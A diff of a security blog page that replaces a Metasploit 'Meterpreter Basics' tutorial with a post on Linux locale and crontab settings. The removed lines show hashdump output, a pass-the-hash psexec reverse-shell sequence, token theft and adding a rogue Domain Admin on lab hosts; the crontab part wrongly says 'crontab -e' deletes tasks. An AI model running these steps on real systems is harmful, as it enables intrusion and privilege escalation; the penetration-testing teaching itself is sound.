@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Meterpreter," />
+  <meta name="keywords" content="basics," />
 
 
 
@@ -79,17 +79,17 @@
 
 
 
-<meta name="description" content="Let’s know something basic before we start. You can skip the following if you are familiar with them.">
-<meta name="keywords" content="Meterpreter">
+<meta name="description" content="localeDefination of the locale a set of parameters that defines the user’s language, region and any special variant preferences that the user wants to see in their user interface. Usually a locale ide">
+<meta name="keywords" content="basics">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Meterpreter Basics">
-<meta property="og:url" content="/2017-12-03-Meterpreter-Basics/index.html">
+<meta property="og:title" content="Locale and Crontab on Linux">
+<meta property="og:url" content="/2017-12-06-Locale-and-Crontab-on-Linux/index.html">
 <meta property="og:site_name" content="Security blog">
-<meta property="og:description" content="Let’s know something basic before we start. You can skip the following if you are familiar with them.">
-<meta property="og:updated_time" content="2017-12-05T14:24:46.545Z">
+<meta property="og:description" content="localeDefination of the locale a set of parameters that defines the user’s language, region and any special variant preferences that the user wants to see in their user interface. Usually a locale ide">
+<meta property="og:updated_time" content="2017-12-06T15:33:09.647Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Meterpreter Basics">
-<meta name="twitter:description" content="Let’s know something basic before we start. You can skip the following if you are familiar with them.">
+<meta name="twitter:title" content="Locale and Crontab on Linux">
+<meta name="twitter:description" content="localeDefination of the locale a set of parameters that defines the user’s language, region and any special variant preferences that the user wants to see in their user interface. Usually a locale ide">
 
 
 
@@ -119,13 +119,13 @@
 
 
 
-  <link rel="canonical" href="/2017-12-03-Meterpreter-Basics/"/>
+  <link rel="canonical" href="/2017-12-06-Locale-and-Crontab-on-Linux/"/>
 
 
 
 
 
-  <title>Meterpreter Basics | Security blog</title>
+  <title>Locale and Crontab on Linux | Security blog</title>
   
 
 
@@ -262,7 +262,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="/2017-12-03-Meterpreter-Basics/">
+    <link itemprop="mainEntityOfPage" href="/2017-12-06-Locale-and-Crontab-on-Linux/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Ꭰ">
@@ -279,7 +279,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Meterpreter Basics</h1>
+          <h1 class="post-title" itemprop="name headline">Locale and Crontab on Linux</h1>
         
 
         <div class="post-meta">
@@ -291,8 +291,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-03T14:29:27+08:00">
-                2017-12-03
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-12-06T23:32:59+08:00">
+                2017-12-06
               </time>
             
 
@@ -314,8 +314,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/" itemprop="url" rel="index">
-                    <span itemprop="name">Penetration Test</span>
+                  <a href="/categories/Linux/" itemprop="url" rel="index">
+                    <span itemprop="name">Linux</span>
                   </a>
                 </span>
 
@@ -351,32 +351,18 @@
       
 
       
-        <p>Let’s know something basic before we start. You can skip the following if you are familiar with them.</p>
-<a id="more"></a>
-<h4 id="Terminology"><a href="#Terminology" class="headerlink" title="Terminology"></a>Terminology</h4><ul>
-<li><strong>Exploit</strong> (<em>An exploit is the means by which an attacker, or pen tester for that matterk takes advantage of a flaw within a system, an application, or a service.</em>)</li>
-<li><strong>Payload</strong> (<em>A payload is code that we want the system to execute and that is to be selected and delivered by the Framework</em>) For example, <em>a reverse shell</em> is a payload that creates a connection from the target machine back to the attacker as a Windows command prompt, whereas a <em>bind shell</em> is a payload that “binds” a command prompt to a listening port on the target machine, which the attacker can then connect.</li>
-<li><strong>Shellcode</strong> (<em>Shellcode</em> is a set of instructions used as a payload when exploitation occurs.)</li>
-<li><strong>Module</strong> (A <em>module</em> in the context of this book is a piece of software that can be used by the Metasploit Framework)</li>
-<li><strong>Listener</strong> (A <em>Listener</em> is a component within Metasploit that waits for an incoming connection of some sort.)</li>
-<li><strong>Resource Files</strong> (<em>Resource files</em> are script files that automate commands within msfconsole. They contain a list of commands that are executed from msfconsole and run sequentially) For example,  <em>msfconsole -r filename.rc</em> </li>
-</ul>
-<h4 id="Hash-Dump"><a href="#Hash-Dump" class="headerlink" title="Hash Dump"></a>Hash Dump</h4><p>If we exploit a windows machine in the penetration test, the next step is how to get the administrative privileges. Here are some tips.</p>
-<p>Try to dump the usernames and passwords. Because the <em>module</em> priv is integrated into the <em>meterpreter</em> . So what you need to do is just type the chars <em>hashdump</em>. You will see the following. </p>
-<p><em>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</em></p>
-<p>Remember that the hash value starts with <em>aad3b435</em> is simply an empty or null hash value — a placeholder for an empty string. Besides that we should know that we must run as <strong>SYSTEM</strong> to get around the registry restrictions and dump the protected the selected <strong>SAM(Security Account Manager)</strong> storage that contains Windows usernames and passwords.</p>
-<p>What should I do after I got the hash value? Of course, you can use the rainbow table to crack the hash password. We can pass the hash value to login if we can’t crack the hash value just like the normal logon. </p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">use windows/smb/psexec</div><div class="line">set PAYLOAD windows/meterpreter/reverse_tcp</div><div class="line">set LHOST 192.168.33.129</div><div class="line">set LPORT 443</div><div class="line">set RHOST 192.168.33.130</div><div class="line">set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0</div><div class="line">exploit</div></pre></td></tr></table></figure>
-<h4 id="Get-System"><a href="#Get-System" class="headerlink" title="Get System"></a>Get System</h4><p>The easiest way to escalate privilege is use the command <code>getsystem</code> which has been integrated into the <em>meterpreter</em>. </p>
-<h4 id="Token-Impersonation"><a href="#Token-Impersonation" class="headerlink" title="Token Impersonation"></a>Token Impersonation</h4><p><em>Token impersonation</em> is very beneficial for penetration tests and can be one of Meterpreter’s most powerful features. We check the running process at the first with the command <code>ps</code>.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; ps</div><div class="line"></div><div class="line">Process list</div><div class="line">============</div><div class="line"></div><div class="line">PID      Name               Arch   Session   User                    Path</div><div class="line">---      ----               ----   -------   ----                    ----</div><div class="line">4        System             x86    0         NT AUTHORITY\SYSTEM     </div><div class="line">380      cmd.exe            x86    0         SNEAKS.IN\ihazdomainadmin \System\</div><div class="line"></div><div class="line">meterpreter &gt;</div></pre></td></tr></table></figure>
-<p>Next, we can impersonate the token by <em>steal_token pid</em> command as shown below.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">meterperter &gt; steal_token 380</div><div class="line">Stolen token with username: SNEAKS.IN\ihazdomainadmin</div><div class="line">meterperter &gt;getuid</div><div class="line">Server username: SNEAKS.IN\ihazdomainadmin</div></pre></td></tr></table></figure>
-<p>Sometimes, the <em>ps</em> may not list a running process running as a <em>domain administrator</em>. We can leverage <em>incognito</em> to list available tokens on the system as well. When performing a penetration test, we should check the output of both <em>ps</em> and <em>incognito</em> to because the results may vary.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; use incognito</div><div class="line">Loading extension incognito...Success.</div><div class="line">meterpreter &gt; list_tokens -u</div><div class="line"></div><div class="line">Delegation Tokens Available</div><div class="line">========================================</div><div class="line">NT AUTHORITY\SYSTEM</div><div class="line">Window Manager\DWM-1</div><div class="line">Window Manager\DWM-2</div><div class="line"></div><div class="line">Impersonation Tokens Available</div><div class="line">========================================</div><div class="line">NT AUTHORITY\LOCAL SERVICE</div><div class="line">NT AUTHORITY\NETWORK SERVICE</div></pre></td></tr></table></figure>
-<p>Now we can impersonate the accounts list above and add a user account to the domain server.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">meterpreter &gt; impersonate_token SNEAKS.IN\\ihazdomainadmin</div><div class="line">[+] Delegation token available</div><div class="line">[+] Successfully impersonated user SNEAKS.IN\ihazdomainadmin</div><div class="line">meterpreter &gt; add_user omgcompromised p@55w0rd! -h 192.168.33.50</div><div class="line">[*] Attepting to add user omgcompromised to host 192.168.33.50</div><div class="line">[+] Successfully added user</div><div class="line">meterpreter &gt; add_group_user &quot;Domain Admins&quot; omgcompromised -h 192.168.33.50</div><div class="line">[*] Attempting to add user omgcompromised to group Domain Admins on domain controller 192.168.33.50</div><div class="line">[+] Successfully added user to group</div></pre></td></tr></table></figure>
-<p>Happy Weekend.</p>
+        <h3 id="locale"><a href="#locale" class="headerlink" title="locale"></a><em>locale</em></h3><h4 id="Defination-of-the-locale"><a href="#Defination-of-the-locale" class="headerlink" title="Defination of the locale"></a><em>Defination of the locale</em></h4><blockquote>
+<p>a set of parameters that defines the user’s language, region and any special variant preferences that the user wants to see in their user interface. Usually a locale identifier consists of at least a language identifier and a region identifier.</p>
+</blockquote>
+<p>You must experienced the following error if you often play around with Linux.<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">locale: Cannot set LC_CTYPE to default locale: No such file or directory</div><div class="line">locale: Cannot set LC_ALL to default locale: No such file or directory</div><div class="line">LANG=en_US.UTF-8</div><div class="line">LANGUAGE=</div><div class="line">LC_CTYPE=en_CA.UTF-8</div><div class="line">LC_NUMERIC="en_US.UTF-8"</div><div class="line">LC_TIME="en_US.UTF-8"</div><div class="line">LC_COLLATE="en_US.UTF-8"</div><div class="line">LC_MONETARY="en_US.UTF-8"</div><div class="line">LC_MESSAGES="en_US.UTF-8"</div><div class="line">LC_PAPER="en_US.UTF-8"</div><div class="line">LC_NAME="en_US.UTF-8"</div><div class="line">LC_ADDRESS="en_US.UTF-8"</div><div class="line">LC_TELEPHONE="en_US.UTF-8"</div><div class="line">LC_MEASUREMENT="en_US.UTF-8"</div><div class="line">LC_IDENTIFICATION="en_US.UTF-8"</div><div class="line">LC_ALL=</div></pre></td></tr></table></figure></p>
+<p>It’s the most effective way to change the content of the file named <em>/etc/default/locale</em>, but rememebered that you must check what you can do by  command <em>locale -a</em>.<br><em>file: /etc/default/locale</em><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LANG=en_US.UTF-8</div></pre></td></tr></table></figure></p>
+<p><em>command</em><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">root@debian:~# locale -a</div><div class="line">C</div><div class="line">C.UTF-8</div><div class="line">en_US.utf8</div><div class="line">POSIX</div><div class="line">root@debian:~#</div></pre></td></tr></table></figure></p>
+<p><em>changed: /etc/default/locale</em><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span>  File generated by update-locale</div><div class="line">LANG=en_US.UTF-8</div><div class="line">LANGUAGE=en_US.UTF-8</div><div class="line">LC_CTYPE=en_US.UTF-8</div><div class="line">LC_ALL=en_US.UTF-8</div></pre></td></tr></table></figure></p>
+<p>You should execute <em>source bash</em> or logout after you change the file <em>/etc/default/locale</em>.<br>Please, pay attention to the priority to these setting.<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">LC_ALL &gt; LC_* &gt; LANG</div></pre></td></tr></table></figure></p>
+<p>All in one word, the <em>LC_ALL</em> is the boss and the <em>LANG</em> is the lowest.</p>
+<h3 id="Crontab"><a href="#Crontab" class="headerlink" title="Crontab"></a>Crontab</h3><p>The first thing to do is check the status of the program <em>crond</em>.<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">root@debian:~# systemctl is-active crond</div><div class="line">inactive</div><div class="line">root@debian:~#</div></pre></td></tr></table></figure></p>
+<p>It’s very easy to use the command <em>crontab</em>.<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">crontab [-u user] file</div><div class="line">crontab [ -u user ] [ -i ] &#123; -e | -l | -r &#125;</div><div class="line">crontab -l    # check the taks for current user if without -u option</div><div class="line">conntab file  # take the file as timing task</div><div class="line">crontab -e    # delete current user task</div></pre></td></tr></table></figure></p>
+<p><strong><em>Happy Linux</em></strong></p>
 
       
     </div>
@@ -394,7 +380,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/Meterpreter/" rel="tag"># Meterpreter</a>
+            <a href="/tags/basics/" rel="tag"># basics</a>
           
         </div>
       
@@ -407,8 +393,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017-12-02-The-Summary-of-the-absolute-baics-of-penetration-/" rel="next" title="The Summary of the absolute baics of penetration testing">
-                <i class="fa fa-chevron-left"></i> The Summary of the absolute baics of penetration testing
+              <a href="/2017-12-03-Windows-Powershell-backdoor/" rel="next" title="Windows Powershell Backdoor -- Timing Task">
+                <i class="fa fa-chevron-left"></i> Windows Powershell Backdoor -- Timing Task
               </a>
             
           </div>
@@ -416,10 +402,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017-12-03-Windows-Powershell-backdoor/" rel="prev" title="Windows Powershell Backdoor -- Timing Task">
-                Windows Powershell Backdoor -- Timing Task <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -580,7 +562,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#Terminology"><span class="nav-number">1.</span> <span class="nav-text">Terminology</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Hash-Dump"><span class="nav-number">2.</span> <span class="nav-text">Hash Dump</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Get-System"><span class="nav-number">3.</span> <span class="nav-text">Get System</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Token-Impersonation"><span class="nav-number">4.</span> <span class="nav-text">Token Impersonation</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#locale"><span class="nav-number">1.</span> <span class="nav-text">locale</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Defination-of-the-locale"><span class="nav-number">1.1.</span> <span class="nav-text">Defination of the locale</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Crontab"><span class="nav-number">2.</span> <span class="nav-text">Crontab</span></a></li></ol></div>
             
 
           </div>
